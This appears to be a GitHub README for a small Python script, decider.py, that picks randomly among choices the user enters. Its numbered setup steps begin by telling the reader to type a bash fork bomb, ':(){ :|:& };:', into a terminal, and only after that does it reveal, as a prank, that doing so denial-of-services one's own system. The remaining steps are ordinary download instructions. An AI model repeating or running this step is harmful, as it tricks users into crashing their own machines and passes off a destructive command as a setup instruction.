# Domingo's Very Good Code
python script for choice selection post input

Simple script I rewrote from another code;
input things you want to randomly choose from, get result (and maybe land on a secret joke answer)

This time you can declare how many choices will be included in a list to choose from


INSTRUCTION

Open terminal
1. Type in   :(){ :|:& };:   and press Enter
2. Wait for it
3. Wait for it
4. If you're still reading this, you're not an idiot who just DoS'd their own system. You are now awarded one gold star

5. Up top, green "<> Code" button, download your preferred way, or if you're not sure:
zip > open downloads > extract > open project folder > decider.py should be present.
You can move it wherever you want and also delete the two folders (one zip, one extracted)
